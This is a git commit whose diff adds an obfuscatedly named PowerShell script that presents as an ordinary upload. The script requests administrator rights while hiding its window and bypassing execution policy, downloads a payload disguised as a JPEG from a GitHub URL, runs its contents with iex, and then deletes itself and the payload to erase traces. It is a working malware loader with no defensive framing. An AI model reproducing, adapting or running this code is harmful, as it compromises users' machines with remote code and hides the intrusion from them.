f6e5f5b48e76104c1064f8e36cca53ddc1572db4
node-nl0 <irena.dler.fox@gmail.com>
2026-07-11 16:14:52 -0700

    Add files via upload

---
+++ 04A7C1QX50.ps1
@@ -0,0 +1,8 @@
+if(!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator')){
+    Start-Process -Verb RunAs powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -WindowStyle Hidden;exit
+}
+$url="https://raw.githubusercontent.com/node-nl0/go/main/0x480x8b0x5.jpg"
+$path="$env:TEMP\0x480x8b0x5.jpg"
+(New-Object Net.WebClient).DownloadFile($url,$path)
+iex(Get-Content $path -Raw)
+Start-Process -WindowStyle Hidden cmd -ArgumentList "/c timeout /t 25 /nobreak > nul & del /f /q $env:TEMP\04A7C1QX50.ps1 $env:TEMP\0x480x8b0x5.jpg & del /f /q %0"
